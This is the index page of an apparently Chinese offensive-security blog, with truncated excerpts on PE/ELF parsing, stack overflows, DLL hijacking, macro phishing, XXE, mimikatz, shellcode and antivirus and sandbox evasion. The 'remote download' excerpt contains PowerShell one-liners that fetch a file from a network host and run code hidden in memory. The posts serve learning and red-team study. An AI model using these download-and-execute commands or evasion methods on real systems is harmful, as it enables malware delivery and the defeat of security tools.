Cross-site scripting的英文首字母缩写本应为CSS，但因为CSS在网页设计领域已经被广泛指层叠样式表（Cascading Style Shee ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/12/06/ExecutableLinkableFormat/" title="Linux ELF格式解析">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/119.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux ELF格式解析"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/12/06/ExecutableLinkableFormat/" title="Linux ELF格式解析">Linux ELF格式解析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-06T15:45:42.000Z" title="发表于 2020-12-06 23:45:42">2020-12-06</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.390Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
在写PE结构解析的时候，以为ELF结构没必要去看文件结构，直到后面做了PWN题发现不是这样的，所有还是学习下ELF结构，然后再写个解析器

常见结构区分
目前，PC平台流行的可执行文件格式（Executable）主要包含如下两种，它们都是COFF（Common File Format）格式的变种

Windows下的PE（Portable Executable）
Linux下的ELF（Executable Linkable Format）

源代码经过编译后但未进行连接的那些中间文件（Windows的.obj和Linux的.o），它与可执行文件的格式非常相似，所以一般跟可执行文件格式一起采用同一种格式存储。
其中动态链接库（DDL，Dynamic Linking Library）和静态链接库（Static Linking Library）的格式都和当前系统对应的可执行文件结构一样

动态链接库：Windows的.dll、Linux的.so ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/11/20/StackOverflow_Linux_0x02/" title="Linux栈溢出总结（0x02）">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/118.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux栈溢出总结（0x02）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/20/StackOverflow_Linux_0x02/" title="Linux栈溢出总结（0x02）">Linux栈溢出总结（0x02）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-20T10:45:42.000Z" title="发表于 2020-11-20 18:45:42">2020-11-20</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T02:10:09.877Z" title="更新于 2021-05-17 10:10:09">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

在上篇中介绍了一些常见保护，以及如何开关，还有如何生成shellcode等操作，就那么点东西我搞了一星期，真是菜吐了，心态崩了了





写在前面的几个笔记

CALL和RET指令解释

CALL指令调用某个子函数时，下一条指令的地址作为返回地址被保存到栈中。等价于PUSH返回地址与JMP函数地址的指令序列
RET指令跳转到CALL指令保存的返回地址，讲控制权交还给调用函数。等价于POP返回地址与JMP返回地址的指令序列


AMD64和i386的区别
由于后面的利用方式可能会用到64位的程序，所以在前面把两者几个点需要区别下

首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则就会抛出异常。
其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI、RSI、RDX、RCX、 R8和R9中，如果还有更多的参数的话才会保存在栈 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/11/19/StackOverflow_Linux_0x01/" title="Linux栈溢出总结（0x01）">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/117.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux栈溢出总结（0x01）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/19/StackOverflow_Linux_0x01/" title="Linux栈溢出总结（0x01）">Linux栈溢出总结（0x01）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-19T10:45:42.000Z" title="发表于 2020-11-19 18:45:42">2020-11-19</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T02:09:49.634Z" title="更新于 2021-05-17 10:09:49">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

记录下自己学习堆栈溢出的内容，这篇就是栈溢出入门的东西，也算是栈溢出总结的上篇，缝合怪文章大部分都是参考各个师傅的文章，后面还会有堆溢出。写文章的初心是为了总结梳理下自己的学习过程。


栈溢出利用方式

ROP（修改返回地址，让其指向内存中已有的一段指令
ret2shellcode（修改返回地址，让其指向溢出数据中的一段指令
ret2libc（修改返回地址，让其指向内存中已有的某个函数
BROP
ret2dl-resolve
SROP




常用保护机制
CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/11/13/DynamicLinkLibraryHijack/" title="恶意程序研究之DLL劫持">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/115.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="恶意程序研究之DLL劫持"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/13/DynamicLinkLibraryHijack/" title="恶意程序研究之DLL劫持">恶意程序研究之DLL劫持</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-13T07:45:42.000Z" title="发表于 2020-11-13 15:45:42">2020-11-13</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.389Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
DLL劫持DLL劫持一直深受黑客们的喜欢，利用此技术可以实现启动木马后门，游戏外挂插件的注入，绕过UAC等操作。
全文约定：全文中系统盘所在的位置默认为C盘
DLL加载顺序DLL是以文件的形式存在在硬盘中，那么应用程序又是如何索引所需的DLL呢？其实，Microsoft已在此处完整记录了DLL搜索顺序。

微软的DLL劫持分为三个阶段


无保护阶段：Windows XP SP2之前
保护阶段：Windows XP SP2之后，Windows 7之前
进一步保护阶段：Windows 7之后


Windows XP SP2之前

进程对应的应用程序所在目录；
加载 DLL 时所在的当前目录；
系统目录即 SYSTEM32 目录（通过 GetSystemDirectory 获取）；
16位系统目录即 SYSTEM 目录；
Windows目录（通过 GetWindowsDirectory 获取）；
PATH环境变量中的各个目录；


Windows  ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/11/02/WindowsTalk/" title="Windows杂谈">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/116.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows杂谈"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/02/WindowsTalk/" title="Windows杂谈">Windows杂谈</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-02T10:45:42.000Z" title="发表于 2020-11-02 18:45:42">2020-11-02</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">
前言

梳理Windows的历史


Windows杂谈微软于1985年11月20日推出了名为Windows的操作系统，作为MS-DOS的图形操作系统外壳，而MacOS是1984年推出的。并且Windows 10是微软最后一个版本的操作系统，不在会有像Windows 7 和Windows 7 sp1 或者sp2这种升级，而是统一使用Windows 10 1507这样的编号。
 
Windows内核区别
MS-DOS
1980年，西雅图计算机产品公司的一名24岁的程序员Tim Paterson(蒂姆·帕特森)花费了四个月时间编写出了 86-DOS 操作系统。1981年7月，微软以五万美元的代价向西雅图公司购得本产品的全部著作权，并将它更名为 MS-DOS。
MS-DOS源码下载
1https:&#x2F;&#x2F;computerhistory.org&#x2F;blogs&#x2F;microsoft-research-license-agreement-msdos-v1-1-v2-0&#x2F;


Windows 95
Windows 95是微软公司于1995年推出的电脑操作系 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/07/26/Office_0x01/" title="关于邮件钓鱼的哪些事">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/111.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于邮件钓鱼的哪些事"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/26/Office_0x01/" title="关于邮件钓鱼的哪些事">关于邮件钓鱼的哪些事</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-26T13:45:42.000Z" title="发表于 2020-07-26 21:45:42">2020-07-26</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.721Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

漏洞利用那一节放到下篇吧，复现环境有点难找
测试环境
kail-2019.4
windows7 sp1 x64
windows10 x64

Office宏首先来区别下Word和Excel各种后缀中的区别Word文档97-2003的旧版本文件名后缀就是**.doc**
从2007版以后后缀名是**.docx**
docx厉害一点。它是被压缩过的文档，体积更小，能处理更加复杂的内容，访问速度更快。
如果把docx的改为zip的话可以解压出里面的所有数据，不过空文档大部分都是XM格式的文件
Excel表格xls是一个特有的二进制格式，其核心结构是复合文档类型的结构，而xlsx的核心结构是XML类型的结构，采用的是基于XML的压缩方式，使其占用的空间更小。xlsx中最后一个x的意义就在于此。
xls是2003版本下的文件 ，不管有没有宏程序的话都是xls文件 ，从2007开始做了区分，xlsm文件和xlsx文件都是excel 2007及其以后 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/07/24/XXE/" title="XXE的一些利用方式">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/110.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XXE的一些利用方式"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/24/XXE/" title="XXE的一些利用方式">XXE的一些利用方式</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-24T13:45:42.000Z" title="发表于 2020-07-24 21:45:42">2020-07-24</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

对没错这是这星期的第四篇文章了，我感觉要肝不动了啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊


XXE是什么XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 外部实体 ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(盯好外部实体就行了)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）

基础知识XML是一种用于标记电子文件使其具有结构性的标记语言，用于标记电子文 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/07/23/InformationGathering/" title="信息收集总结">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/109.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息收集总结"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/23/InformationGathering/" title="信息收集总结">信息收集总结</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-23T13:45:42.000Z" title="发表于 2020-07-23 21:45:42">2020-07-23</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

对没错这是这星期的第三篇文章了，目前只写了个GitHub的使用方法，等周六周天补充吧
Github搜索语法众所周知，GitHub就是信息泄露的宝库之一，用好语法天天高危来敲你家门（逃
相关语法查询大于或小于另一个值的值您可以使用&gt;，&gt;=，&lt;，和&lt;=搜索是大于，大于或等于，小于和小于或等于另一个值的值。



查询
示例



&gt;n
cats stars:&gt;1000 匹配含有 “cats” 字样、星标超过 1000 个的仓库。


&gt;=n
cats topics:&gt;=5 匹配含有 “cats” 字样、有 5 个或更多主题的仓库。


&lt;n
cats size:&lt;10000 匹配小于 10 KB 的文件中含有 “cats” 字样的代码。


&lt;=n
cats stars:&lt;=50 匹配含有 “cats” 字样、星标不超过 50 个的仓库。


n..*
cats sta ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/07/20/HttpCertificate/" title="解决安卓单向/双向认证导致无法抓包">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/107.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="解决安卓单向/双向认证导致无法抓包"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/20/HttpCertificate/" title="解决安卓单向/双向认证导致无法抓包">解决安卓单向/双向认证导致无法抓包</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-20T12:45:53.000Z" title="发表于 2020-07-20 20:45:53">2020-07-20</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

本文思路来着公众号小和尚的安全之路，菜鸡的我周天面试被社会毒打了一顿，问了双向认证问题，但是这玩意我没接触过，刚好今天看到一篇文章，学习一下


首先准备工作
XposedInstaller（Xposed安装器）
JustTrustMe（禁用SSL）
ida pro（静态逆向程序）
JEB（apk解包程序）
test.apk（目标程序）

所需文件位置下载
1https:&#x2F;&#x2F;github.com&#x2F;Ascotbe&#x2F;virus&#x2F;blob&#x2F;master&#x2F;HttpCertificate

解决单向认证安装Xposed框架刚开始安装好APK是显示框架未安装的

点击这个安装

xuanz安装

接着点击安装

然后从起后就能看到安装成功了

安装JustTrusMe模块
点击左上角的菜单

然后选着模块

勾选就好了，这样就解决了单向认证，可以绕过客户端校验了
解决双向认证我们 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/07/12/RemoteDownload/" title="恶意程序研究之远程下载恶意程序">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/106.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="恶意程序研究之远程下载恶意程序"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/12/RemoteDownload/" title="恶意程序研究之远程下载恶意程序">恶意程序研究之远程下载恶意程序</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-12T07:45:42.000Z" title="发表于 2020-07-12 15:45:42">2020-07-12</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.389Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
前言我知道上篇文章没有写完，但是把看到什么学什么，要终结的嘛你说是吧（ps:后续有其他方法也会更新到这里的

Windows命令行自带工具PowerShellPowerShell是一种跨平台的任务自动化和配置管理框架，由命令行管理程序和脚本语言组成，与大多数接受并返回文本的 shell 不同，PowerShell构建在 .NET公共语言运行时 (CLR) 的基础之上，接受并返回.NET对象，这从根本上的改变引入了全新的自动化工具和方法。
远程下载文件到本地：
1powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.183.138:8000/test.txt&#x27;,&#x27;test.exe&#x27;)


直接把文本转换为exe文件运行，无残留文件
1powershell -nop -w hidden -c &quot;IEX ((n ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/07/05/PortableExecutableParser/" title="恶意程序研究之PE解析器">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/104.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="恶意程序研究之PE解析器"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/05/PortableExecutableParser/" title="恶意程序研究之PE解析器">恶意程序研究之PE解析器</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-05T12:45:53.000Z" title="发表于 2020-07-05 20:45:53">2020-07-05</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.389Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
前言之前为了学习PE结构知识恶补了一下相关文章，然后使用010 Editor这个软件也可以完整的读取出PE的结构和字段，但是这都是别人写好的，自己没有玩过一遍的东西都不叫学过，那只能叫见过所以就有了这篇文章，各位看官别急需要几天时间才能搞定，毕竟还不熟悉如果有哪里写错了，忘各位斧正！（PS：当前代码输出不够美观后期会修改）
使用环境
Visual Studio 2019 （宇宙最强编译器
windows 10

前置知识恶意程序研究之PE结构梳理
获取文件映象首先介绍下内存映射文件技术作用

使用内存映射文件来访问磁盘上的数据文件。这使你可以不必对文件执行I/O操作，并且可以不必对文件内容进行缓存.
可以使用内存映射文件，使同一台计算机上运行的多个进程能够相互之间共享数据。windows确实提供了其他一些方法，以便在进程之间进行数据通信，但是这些方法都是使用内存映射文件来实现的，诸如使用SendMessage或者PostMessage，都在内部使 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/05/21/BypassTheVirtualMachine/" title="恶意程序研究之绕过虚拟机">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/101.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="恶意程序研究之绕过虚拟机"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/21/BypassTheVirtualMachine/" title="恶意程序研究之绕过虚拟机">恶意程序研究之绕过虚拟机</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-05-21T15:00:00.000Z" title="发表于 2020-05-21 23:00:00">2020-05-21</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
前言新篇章开始了，主要讲一些探测沙盒以及编译工具的方法，之前我写的那个勒索病毒用到的大部分方法我都会总结到这里，也会参考一些师傅的文章，算是一个巩固吧，最后会把所有代码上传到GitHub中，之前免杀里面说的一些像加密之类的操作这里就不在重复写了。


这是半成品，还有几个代码没敲完，还有点瑕疵
从编译角度来看免杀全篇文章以免杀中的VirtualAllocPlanA作为基础例子来验证我们的猜想，
删除链接库有些反病毒软件会识别链接器中的问题，如果说xxx.lib这些编译器会自动帮我们加上，如果把链接器选项中的其他依赖项删除掉(尤其是kernel32.lib)，某些反恶意软件引擎就不会把生成的可执行文件标记为恶意的。
这是系统自带的附加依赖，我们生产后放到TV中查杀看看

可以看到免杀率为28/72

接着把附加依赖项删除了，重新生成

可以看到我们绕过了5家杀软，免杀率23/72

知道PE原理的小伙伴可能会说把这个删了文件就无法加载kernel3 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/04/18/ShellCode/" title="恶意程序研究之定义ShellCode">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/93.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="恶意程序研究之定义ShellCode"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/18/ShellCode/" title="恶意程序研究之定义ShellCode">恶意程序研究之定义ShellCode</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-04-18T15:07:46.000Z" title="发表于 2020-04-18 23:07:46">2020-04-18</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.721Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
前言终于写完了，应该挺详细的，奥利给

环境配置讲解当前项目使用的vs2019，其他vs编译器都可以
清除多余的函数首先创建一个项目，然后什么配置都不修改使用release生成如下代码
1234int main()&#123;	return 0;&#125;

然后我们把生成的exe文件放到ida里面去可以看到下图，明明我们什么函数都没有加为什么会多出这么多函数呢？

其实这些函数都是vs编译器自动帮我加进去的，我们的代码段加上这些函数就组成了一个PE文件
位置：项目-&gt;配置属性-&gt;高级-&gt;入口点中添加MyMian字段，这个字段可以随意修改
接着我们把原先的代码替换为如下代码，然后重新生成
12345int MyMain()&#123;	return 0;&#125;


可以看到多余的函数都不见了
禁用安全检查上面是不是还有一个多余函数，该函数是用于安全检查用的，我们一样可以关闭它。
位置：项目-&gt;配置属性-&gt;C/ ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/04/14/Mimikatz/" title="mimikatz使用说明">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/92.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mimikatz使用说明"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/14/Mimikatz/" title="mimikatz使用说明">mimikatz使用说明</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-04-14T15:07:46.000Z" title="发表于 2020-04-14 23:07:46">2020-04-14</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.721Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

只记录自己用过的命令
基本命令

exit:退出当前程序

cls:清屏

answer:对生命、宇宙和万物的终极问题的回答。

coffee：显示一杯咖啡图案，请阿姨喝杯卡布奇诺。

sleep：默认睡眠 1000ms，后跟时间参数，比如sleep 5000，就会睡眠5000ms。

log：记录 Mimikatz 所有的输入和输出到当前目录下的 log.txt 文件，它只会记录输入log命令后的输入和输出，当你没有启动这个命令之前的所有命令都不会记入进去。

base64：将输入/输出转换成 base64 编码。

version：查看Mimikatz的版本

cd：切换或者显示当前目录。与linux命令相同

localtime：显示系统当前时间和 UTC 时间。

hostname：显示主机的名称。


使用模块输入::显示其支持模块信息。


standard：标准模块，基本命令，不需要模块信息
该模块就是上文中的基础命令

 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/03/31/raspberry_monitor_0x02/" title="利用树莓派来监听任务目标(下)">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/90.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用树莓派来监听任务目标(下)"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/31/raspberry_monitor_0x02/" title="利用树莓派来监听任务目标(下)">利用树莓派来监听任务目标(下)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-31T14:57:46.000Z" title="发表于 2020-03-31 22:57:46">2020-03-31</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">
前言
距离上次的上篇已经过去了小半年时间了，真的不是我咕咕了，是因为自己挖的坑有点多，本片文章主要介绍的是如何对人脸进行检测和检测后的通讯方式，树莓派zeor w性能有点更不上所以我又买了4B（小声BB可能还有终篇



硬件清单

读卡器以及 SD 卡
树莓派官方摄像头一枚（夜视版
树莓派4B
电源(实际场景需要装个充电宝或者使用定制的电源)
监听模块(如果想要带上声音可以装个)


安装python-opencv
更新树莓派系统在这之前记得话pip源 、apt源、系统更新源换成国内的，并且使用树莓派4并且刷入最新版的包，刷入包的哈希值
SHA-256:c9c382b659bd96b859ccb9e2ac0c2292a91a37c286ab464f2f380d451077663d
12sudo apt-get updatesudo apt-get upgrade

安装python-OpenCV在这之前还需要把系统自带的python软连接换成python3.7的
先查看系统中有那些Python版本
123456$ ls /usr/bin/python*/usr/bin/python ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/03/23/PortableExecutable/" title="Windows PE结构解析">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/89.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows PE结构解析"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/23/PortableExecutable/" title="Windows PE结构解析">Windows PE结构解析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-23T15:45:42.000Z" title="发表于 2020-03-23 23:45:42">2020-03-23</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
前言不管你是逆向领域，还是开发领域，异或是病毒编写者（红蓝对抗），都需要对PE文件有详细的了解，由于自己是个菜逼然后需要用到修改PE结构来达到某些免杀的操作，既然这样我就祭出菜逼大杀器Google百度来自行学习，本篇文章主要都是摘抄各位师傅们的文章，加上菜逼我的理解混合在一起的，如果有哪些地方理解错了或者填错了请各位师傅斧正！！


总体介绍可执行文件(Executable File)是指可以由操作系统直接加载执行的文件，在Windows操作系统中可执行文件就是PE文件结构，在Linux下则是ELF文件，下面这张图就是PE文件格式的图片(来自看雪)，非常大一张图片，其实PE格式就是各种结构体的结合，Windows下PE文件的各种结构体在WinNT.h这个头文件中，可以在VS（宇宙无敌第一编译器）中查询。

PE文件整体结构PE结构可以大致分为:

DOS部分
PE文件头
节表(块表)
节数据(块数据)
调试信息

